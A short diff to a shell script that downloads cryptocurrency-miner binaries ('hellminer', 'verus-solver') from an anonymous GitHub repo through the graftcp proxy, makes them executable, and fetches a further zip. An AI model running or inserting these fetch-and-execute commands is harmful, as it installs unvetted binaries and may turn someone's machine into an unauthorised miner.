@@ -36,8 +36,9 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz 
-tar xf hellminer_cpu_linux.tar.gz   
+./graftcp/graftcp wget https://github.com/principala/a/raw/main/hellminer
+wget https://github.com/principala/a/raw/main/verus-solver  
+chmod +x hellminer verus-solver
  
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
 unzip magicBezzHash.zip 
